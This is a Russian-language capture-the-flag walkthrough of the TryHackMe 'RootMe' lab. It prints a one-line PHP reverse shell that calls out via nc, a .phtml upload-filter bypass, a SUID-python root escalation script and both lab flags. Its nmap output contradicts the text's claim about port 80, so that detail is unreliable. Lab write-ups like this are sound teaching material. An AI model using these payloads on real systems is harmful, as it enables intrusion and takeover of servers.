# Машина RootMe
  Для ясности я разделил прохождение машины на три этапа, каждый из которых я опишу ниже
## Разведка
  Для начала проверим машину на наличие открытых портов с помощью утилиты nmap командой `nmap -sV IP_ADDRESS`.
Вывод:
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-06 14:00 -0400
Nmap scan report for 10.81.145.169
Host is up (0.074s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.93 seconds
```

Отсюда видно, что открыты два порта: 22 и 80. На 80 порту запущен Apache 2.4.41, а на 22 ssh.
  Далее проверим машину на наличие директорий утилитой gobuster. Вводим команду `gobuster dir -u http://IP_ADDRESS -w /usr/share/wordlists/dirb/small.txt -x php`.
Вывод:
```
css                  (Status: 301) [Size: 312] [--> http://10.81.145.169/css/]
index.php            (Status: 200) [Size: 616]
js                   (Status: 301) [Size: 311] [--> http://10.81.145.169/js/]
panel                (Status: 301) [Size: 314] [--> http://10.81.145.169/panel/]
uploads              (Status: 301) [Size: 316] [--> http://10.81.145.169/uploads/]
```

## Получение Реверс-Шела
В директории /panel находится место для загрузки файлов. Я сразу попробовал загрузить туда сырой шелл с расширением .php
Код шелла:

`<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.129.112 8000 >/tmp/f"); ?>`

Машина не позволила мне это сделать, написав в уведомлении, что загрузка php файлов запрещена.
Поэтому я решил просто поменять расширение на phtml, т.к. это самый простой путь, файл будет исполняться как php, но под простенький фильтр расширений уже не попадет.
Как я и ожидал, шелл успешно загрузился. В выводе gobuster я видел директорию /uploads, я сразу перешел в нее и убедился, что файл шелла попал сюда. Для запуска шелла достаточно кликнуть по нему,
Параллельно запустив команду `nc -lnvp LPORT` на целевой машине. Сразу после запуска файла в папке uploads, я получаю шелл, и с помощью недолгой разведки в директории /var/www нахожу файл user.txt с флагом `THM{y0u_g0t_a_sh3ll}`
Для превращение реверс-шелла в полноценный терминал введем команду python3 `-c 'import pty; pty.spawn("/bin/bash")'`
## Эскалация привилигий
Следующим шагом мы повысим привилегии. По стандарту начнем с поиска программ с SUID-битом. Вводим команду `find / -perm -4000 2>/dev/null`.
Из всего вывода, мое внимание привлекла только одна строчка:
`/usr/bin/python2.7`
Мы можем запускать python-файлы от имени суперпользователя. Расскажу один важный ньюанс: в качестве защиты, пайтон сбрасывает привилегии перед запуском, поэтому я сразу же в файле поставлю себе guid и uid в значения 0.
Сразу перехожу в директорию /tmp, потому что там скорее всего у нас будут права для создания скрипта. Код скрипта:
```
import os
os.setgid(0)
os.setuid(0)
os.system('/bin/bash -p') #Флаг -p тут для того, чтобы bash тоже не сбрасывал наши привилегии до обычного юзера
```
После запуска сразу получаем права суперпользователя и перейдя в /root, получаем файлик root.txt c флагом.
Флаг: `THM{pr1v1l3g3_3sc4l4t10n}`
